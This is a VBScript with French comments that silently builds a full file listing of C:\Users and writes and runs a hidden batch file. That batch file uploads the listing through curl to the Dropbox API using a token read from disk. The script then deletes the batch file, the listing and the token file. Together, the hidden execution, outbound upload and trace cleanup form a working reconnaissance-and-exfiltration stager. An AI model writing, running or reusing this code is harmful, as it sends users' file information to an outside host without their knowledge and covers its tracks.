' Définir les objets nécessaires
Set objShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Définir la commande pour générer l'arborescence
Dim cmd
cmd = "cmd.exe /c tree C:\Users /f /a > arbo.txt"

' Exécuter la commande pour générer l'arborescence
objShell.Run cmd, 0, True

' Attendre 5 secondes (5000 millisecondes) pour s'assurer que le fichier est créé
WScript.Sleep 5000

' Créer le fichier batch "send_to_dropbox.bat"
Dim batFile
batFile = "send_to_dropbox.bat"

Dim batContent
batContent = "@echo off" & vbCrLf & _
             "setlocal enabledelayedexpansion" & vbCrLf & vbCrLf & _
             ":: Lire le contenu du fichier token.txt dans la variable TOKEN" & vbCrLf & _
             "set /p TOKEN=<token.txt" & vbCrLf & vbCrLf & _
             ":: Exécuter la commande curl" & vbCrLf & _
             "curl -X POST https://content.dropboxapi.com/2/files/upload ^" & vbCrLf & _
             "--header ""Authorization: Bearer !TOKEN!"" ^" & vbCrLf & _
             "--header ""Dropbox-API-Arg: {""path"": \""/arbo.txt\"", ""mode"": ""add"", ""autorename"": true, ""mute"": false}"" ^" & vbCrLf & _
             "--header ""Content-Type: application/octet-stream"" ^" & vbCrLf & _
             "--data-binary @""arbo.txt"""

' Écrire le contenu dans le fichier batch
Set batStream = fso.CreateTextFile(batFile, True)
batStream.WriteLine batContent
batStream.Close
Set batStream = Nothing

' Attendre 5 secondes avant d'exécuter le fichier batch
WScript.Sleep 5000

' Appeler le fichier batch pour envoyer le fichier à Dropbox
objShell.Run batFile, 0, True

' Attendre que le fichier batch ait fini son exécution avant de supprimer
WScript.Sleep 2000 ' Attendre 2 secondes pour être sûr que le batch est terminé

' Supprimer le fichier batch
fso.DeleteFile batFile

' Supprimer le fichier arbo.txt
fso.DeleteFile "arbo.txt"

' Supprimer le fichier token.txt
fso.DeleteFile "token.txt"

' Libérer les objets
Set fso = Nothing
Set objShell = Nothing
